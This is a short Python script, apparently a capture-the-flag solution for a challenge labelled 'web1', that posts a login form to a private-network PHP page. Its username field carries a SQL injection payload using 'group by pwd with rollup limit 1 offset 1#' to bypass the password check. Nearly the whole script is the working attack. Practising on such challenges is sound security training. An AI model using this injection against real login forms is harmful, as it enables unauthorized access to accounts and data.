import requests
import re

def web1():
    url = 'http://172.16.200.196/web1/index.php'
    print(1)
    data = {'uname': 'iscc_' + "7980'" + 'group by pwd with rollup limit 1 offset 1#', 'pwd': '', 'yzm': ''}
    print(2)
    xinxi = requests.post(url , data=data).text
    print(xinxi)

if __name__ == '__main__':
    web1()